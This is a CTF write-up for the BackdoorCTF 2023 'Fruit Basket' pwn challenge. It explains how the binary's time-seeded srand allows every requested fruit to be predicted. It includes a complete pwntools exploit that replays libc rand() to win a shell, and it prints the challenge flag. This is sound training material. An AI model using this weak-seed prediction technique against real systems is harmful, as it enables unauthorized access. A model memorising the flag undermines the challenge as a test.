---
linkTitle: Fruit Basket
title: Beginner - Fruit Basket
type: docs
---

* Author: P3g4su5   
* Difficulty: Easy
* Description : 🍎🍌🍇🍓🍊🥭🍍🍑🍈🍉
* Attachments : [fruit_basket.zip](https://github.com/Parth-Badgujar/BackdoorCTF-23-Pwn/raw/main/FruitBasket/public/fruit_basket.zip)

## Writeup  

* In this challenge you had to exploit the fact that the program uses `srand(time(NULL))` to set the `RNG seed`, and since the `UNIX time` will be constant for everyone irrespective of local time, you can predict the `seed` and predict all the fruits asked by the program 
*  After sending `50` correct inputs the program will give the shell 
* Here is the decokmpiled program by IDA

* The array of fruits can be recoved by using any debugger 
```C   
fruits = [
    "Apple", 
    "Orange", 
    "Mango", 
    "Banana", 
    "Pineapple", 
    "Watermelon", 
    "Guava", 
    "Kiwi", 
    "Strawberry", 
    "Peach"
]
``` 

* The program is randomly selecting the fruits from the array with `fruits[rand() % 10]`  

* Here is the complete exploit : 

```python
from pwn import * 
import time
import ctypes 

context.log_level = 'debug'
fruits = [
    "Apple", 
    "Orange", 
    "Mango", 
    "Banana", 
    "Pineapple", 
    "Watermelon", 
    "Guava", 
    "Kiwi", 
    "Strawberry", 
    "Peach"
]

libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
p = process('./chal')
libc.srand(int(time.time())) 

for i in range(50):
    p.sendlineafter("guess : ", (fruits[libc.rand() % 10]).encode()) 

p.interactive() 
```

* Remember we might have to add `+5` or `+6` time delay, due to some error in `time.time()`  
<br>  
---

#### Flag : `flag{fru17s_w3r3nt_r4nd0m_4t_a11}` 
